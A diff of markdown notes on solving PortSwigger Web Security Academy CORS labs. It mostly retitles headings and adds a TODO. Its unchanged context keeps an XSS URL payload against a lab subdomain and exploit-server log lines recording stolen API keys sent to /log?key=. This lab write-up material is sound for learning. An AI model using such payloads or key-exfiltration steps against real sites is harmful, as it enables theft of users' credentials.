@@ -1,4 +1,4 @@
-# CORS
+# Cross-origin resource sharing (CORS)
 
 ## CORS vulnerability with basic origin reflection
 ```html
@@ -37,7 +37,7 @@ Then read the API key from log:
 192.168.1.12    2019-11-26 21:43:49 +0000 "GET //log?key=FLgt9zxG64IV2d0DKYDm3pI2kRGtyY6g HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/885332"
 ```
 
-### CORS vulnerability with trusted insecure protocols
+## CORS vulnerability with trusted insecure protocols
 There is an XSS vulnerability in the subdomain:
 ```
 http://stock.acf01f3b1eda3d94803f4c7100240098.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
@@ -52,3 +52,6 @@ Then read the API key from log:
 ```
 192.168.1.12    2019-11-26 22:22:25 +0000 "GET /log?key=eAzFrQXushulGePxvr5qRUUlReJxxyQD HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/329148"
 ```
+
+## CORS vulnerability with internal network pivot attack
+TODO: Expert
